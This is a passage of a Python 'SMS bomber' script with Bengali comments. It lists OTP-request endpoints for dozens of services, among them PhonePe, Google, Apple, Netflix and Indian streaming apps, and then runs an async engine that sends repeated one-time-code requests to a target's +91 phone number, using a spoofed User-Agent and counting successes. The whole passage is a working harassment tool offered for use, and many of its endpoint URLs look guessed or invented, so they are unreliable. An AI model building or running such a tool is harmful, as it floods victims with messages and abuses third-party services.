            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone_number":"{phone}"}}'
        },
        {
            "name": "Mobikwik SMS",
            "url": "https://www.mobikwik.com/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Freecharge SMS",
            "url": "https://www.freecharge.in/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "PhonePe SMS",
            "url": "https://api.phonepe.com/apis/hermes/auth/v1/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Google Pay SMS",
            "url": "https://pay.google.com/gp/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'
        },
        {
            "name": "Amazon Pay SMS",
            "url": "https://www.amazon.in/ap/signin",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"phone={phone}&action=sms_otp"
        },
        {
            "name": "WhatsApp Business SMS",
            "url": "https://business.whatsapp.com/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Telegram SMS",
            "url": "https://my.telegram.org/auth/send_password",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"phone={phone}"
        },
        {
            "name": "Signal SMS",
            "url": "https://signal.org/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
          {
            "name": "Discord SMS",
            "url": "https://discord.com/api/v9/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Snapchat SMS",
            "url": "https://accounts.snapchat.com/accounts/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"phone_number={phone}"
        },
        {
            "name": "Instagram SMS",
            "url": "https://www.instagram.com/api/v1/accounts/send_otp/",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"phone_number={phone}"
        },
        {
            "name": "Facebook SMS",
            "url": "https://www.facebook.com/api/graphql/",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"phone={phone}&otp_type=sms"
        },
        {
            "name": "Twitter SMS",
            "url": "https://api.twitter.com/1.1/account/send_otp.json",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"phone_number={phone}"
        },
        {
            "name": "LinkedIn SMS",
            "url": "https://www.linkedin.com/uas/v2/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Microsoft SMS",
            "url": "https://login.microsoftonline.com/common/oauth2/v2.0/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"phone={phone}"
        },
        {
            "name": "Google SMS",
            "url": "https://accounts.google.com/_/signup/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"phoneNumber={phone}"
        },
        {
            "name": "Apple SMS",
            "url": "https://idmsa.apple.com/appleauth/auth/sign-in/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'
        },
        {
            "name": "Netflix SMS",
            "url": "https://www.netflix.com/api/shakti/v1/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Amazon Prime SMS",
            "url": "https://www.amazon.in/ap/signin",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"phone={phone}&action=prime_otp"
        },
        {
            "name": "Hotstar SMS",
            "url": "https://api.hotstar.com/o/v1/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "SonyLIV SMS",
            "url": "https://www.sonyliv.com/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Zee5 SMS",
            "url": "https://www.zee5.com/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Voot SMS",
            "url": "https://www.voot.com/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "MX Player SMS",
            "url": "https://www.mxplayer.in/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "JioTV SMS",
            "url": "https://www.jiotv.com/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Airtel Xstream SMS",
            "url": "https://www.airtelxstream.in/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "VI Movies SMS",
            "url": "https://www.vimovies.com/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "BMS SMS",
            "url": "https://in.bookmyshow.com/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Paytm Movies SMS",
            "url": "https://paytmmovies.com/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Amazon MiniTV SMS",
            "url": "https://www.amazon.in/ap/signin",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"phone={phone}&action=minitv_otp"
        },
        {
            "name": "Chingari SMS",
            "url": "https://www.chingari.io/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Moj SMS",
            "url": "https://www.mojapp.in/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Josh SMS",
            "url": "https://www.joshapp.in/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Mitron SMS",
            "url": "https://www.mitron.tv/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Roposo SMS",
            "url": "https://www.roposo.com/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        }
       
    ]

# ========== বোম্বার ইঞ্জিন ==========
async def send_one(api, phone, session):
    try:
        url = api["url"](phone) if callable(api["url"]) else api["url"]
        headers = api["headers"].copy()
        headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 11; SM-G998B)"
        if api["method"] == "POST":
            data = api["data"](phone) if api["data"] else None
            async with session.post(url, headers=headers, data=data, timeout=5) as resp:
                return resp.status in [200,201,202,204]
        else:
            async with session.get(url, headers=headers, timeout=5) as resp:
                return resp.status in [200,201,202,204]
    except:
        return False

async def start_bomb(phone, apis, cycles=1):
    print(f"{Fore.CYAN}🎯 +91{phone} -তে {len(apis)*cycles} টি রিকুয়েস্ট পাঠানো হচ্ছে...{Style.RESET_ALL}")
    success = 0
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(cycles):
            for api in apis:
                tasks.append(send_one(api, phone, session))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        success = sum(1 for r in results if r is True)
    print(f"{Fore.GREEN}✅ সফল: {success} টি{Style.RESET_ALL}")
    return success

# ========== মেইন ==========
def main():
    # এনভায়রনমেন্ট থেকে ডেটা নাও
    phone = os.environ.get("PHONE", "")
    cycles = int(os.environ.get("CYCLES", "1"))
    if not phone or len(phone)!=10:
        print(f"{Fore.RED}❌ PHONE এনভায়রনমেন্ট ভেরিয়েবল সেট করো (১০ ডিজিট){Style.RESET_ALL}")
        sys.exit(1)
    print_banner()
    print(f"{Fore.YELLOW}📱 টার্গেট: +91{phone}, সাইকেল: {cycles}{Style.RESET_ALL}")
    apis = get_apis()
    verifier = APIVerifier()
    working = verifier.verify_all(apis)
    if not working:
        print(f"{Fore.RED}❌ কোনো ওয়ার্কিং API পাইনি{Style.RESET_ALL}")
        sys.exit(1)
    # অ্যাসিঙ্ক রান
    loop = asyncio.get_event_loop()
    loop.run_until_complete(start_bomb(phone, working, cycles))

if __name__ == "__main__":
    main()